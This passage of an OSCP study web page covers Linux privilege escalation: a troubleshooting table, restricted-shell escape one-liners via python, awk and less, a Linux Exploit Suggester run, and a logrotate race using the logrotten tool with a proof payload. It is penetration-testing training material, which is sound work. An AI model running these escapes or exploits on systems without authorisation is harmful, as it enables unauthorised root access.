+<table><thead><tr><th>Symptom</th><th>Check next</th></tr></thead><tbody><tr><td><code>sudo -l</code> fails/prompts</td><td>Password requirement, credential correctness and policy—not “no sudo”</td></tr><tr><td>Allowed sudo command gives ordinary shell</td><td>Args/run-as, privilege dropping, <code>NOEXEC</code>, MAC denial</td></tr><tr><td>SUID technique stays low privilege</td><td>Owner/mode, effective UID, <code>nosuid</code>, shell privilege preservation</td></tr><tr><td>Capability command fails</td><td>Exact path, <code>+ep</code>, bounding set, namespace/mount and interpreter support</td></tr><tr><td>Cron edit never runs</td><td>Job/user/schedule, working directory, shell/PATH, logs and pspy</td></tr><tr><td>PATH route ignored</td><td>Absolute command, <code>secure_path</code>, reset environment, wrong directory/order</td></tr><tr><td>Wildcard route ignored</td><td>Working directory, expansion, option order and utility implementation</td></tr><tr><td>Docker permission denied</td><td>Socket ACL, group session, daemon mode and authorization controls</td></tr><tr><td>Kernel PoC fails</td><td>Exact affected build/configuration, architecture, toolchain/dependencies</td></tr><tr><td>Enumerator says “possible”</td><td>Run native commands proving every chain link</td></tr></tbody></table>
+<h2 id="16-verify-and-re-enumerate">16. Verify and re-enumerate</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">id; whoami; groups
+hostname; pwd
+ip addr; ip route
+</code></pre>
+<p>After root, re-enumerate newly readable credentials, services, listeners, mounts and routes. Capture the exact command, decisive output and state transition required by the objective; keep target details and proof material private.</p>
+<h2 id="restricted-shell--escape-the-restriction-without-claiming-root">Restricted shell — escape the restriction without claiming root</h2>
+<p>Use when a login is confined by rbash or an allowlisted command wrapper. Check which binaries and features are actually allowed; the following are alternatives, not a sequence to execute together.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># If the allowed Python interpreter can create a child shell
+python3 -c 'import os; os.execl("/bin/sh", "sh")'
+
+# If an unrestricted awk is in the allowed path
+awk 'BEGIN {system("/bin/sh")}'
+
+# If less allows its shell-escape feature: run less FILE, then enter this in less
+!/bin/sh
+</code></pre>
+<p>Read: run <code>id</code> and check the new shell behavior. This changes the command environment, not the UID. LESSSECURE, a restricted editor build, no-exec controls or an application wrapper can block an otherwise familiar GTFOBins escape. A server-side SSH ForceCommand can ignore the command you supply to ssh; do not repeat a client-side command substitution as though it overrides the server policy.</p>
+<p>Sources: <a href="https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html">upstream 1</a> · <a href="https://gtfobins.github.io/">upstream 2</a>.</p>
+<h2 id="kernel-candidates--linux-exploit-suggester-as-a-second-view">Kernel candidates — Linux Exploit Suggester as a second view</h2>
+<p>Use when manual permission/credential routes have not yielded a candidate and kernel/package evidence justifies checking public local exploits. Transfer a reviewed copy before execution.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">uname -a
+cat /etc/os-release
+bash linux-exploit-suggester.sh
+</code></pre>
+<p>Read: candidates need the advisory's exact kernel/build/configuration and prerequisite checks. Distribution backports can fix a CVE without changing an apparent upstream version. Inspect the PoC's primitive, architecture, compilation and failure impact before choosing it. A suggestion or successful build is not evidence of a vulnerable target or an elevated identity.</p>
+<p>Sources: <a href="https://github.com/The-Z-Labs/linux-exploit-suggester">upstream 1</a>.</p>
+<h2 id="logrotate-race--only-with-a-controlled-log-path-and-privileged-rotation">Logrotate race — only with a controlled log path and privileged rotation</h2>
+<p>Use when root rotates a log in an attacker-controlled path and the configuration creates/copies/compresses a file. A writable log by itself is insufficient. Check the relevant stanza, directory ownership and actual scheduled execution first.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">cat /etc/logrotate.conf
+cat /etc/logrotate.d/SERVICE
+namei -l /PATH/TO/LOG
+systemctl cat logrotate.service logrotate.timer
+
+# Compile a reviewed upstream source; prepare a script payload for the actual consumer
+gcc -o logrotten logrotten.c
+printf '%s\n' 'id > /tmp/logrotate-proof.txt' > payloadfile
+
+# create option; wait for the existing privileged rotation trigger
+./logrotten -p ./payloadfile /PATH/TO/LOG
+
+# Alternative for a matching compress configuration, not an extra required step
+./logrotten -p ./payloadfile -c -s 4 /PATH/TO/LOG
+</code></pre>
+<p>Read: winning the file-write race and executing its contents are separate events. The upstream default targets a shell-completion consumer: it must actually be sourced by a privileged shell before the proof appears. Verify that consumer and then read the proof UID. A low-privilege <code>su</code> rotation, protected parent, incompatible build/filesystem or an absent consumer can rule out this route. Do not force root rotation from a low-privilege account or treat lack of proof as a confirmed race win; return to the scheduled-job/service checks.</p>
+<p>Sources: <a href="https://github.com/whotwagner/logrotten">upstream 1</a> · <a href="https://codeberg.org/whotwagner/logrotten">upstream 2</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200 Ch 18, pp550-582</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">Current OSCP+ Body of Knowledge</a></li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">Current OSCP+ exam guide</a></li>
+<li><a href="https://lizajose.github.io/getSH/privesc?system=linux">getSH Privilege Escalation: Linux</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li><a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/linux/PATH-hijacking">Hexdump PATH hijacking module</a></li>
+<li><a href="https://www.sudo.ws/docs/man/sudoers.man/">sudoers manual</a></li>
+<li><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux capabilities manual</a></li>
+<li><a href="https://www.freedesktop.org/software/systemd/man/latest/systemctl.html">systemctl manual</a></li>
+<li><a href="https://docs.docker.com/reference/cli/docker/container/run/">Docker run reference</a> and <a href="https://docs.docker.com/engine/install/linux-postinstall/">Docker Linux post-install security</a></li>
+<li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPEAS</a>, <a href="https://github.com/diego-treitos/linux-smart-enumeration">LSE</a>, <a href="https://github.com/DominicBreuker/pspy">pspy</a> and <a href="https://gtfobins.github.io/">GTFOBins</a></li>
+</ul></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
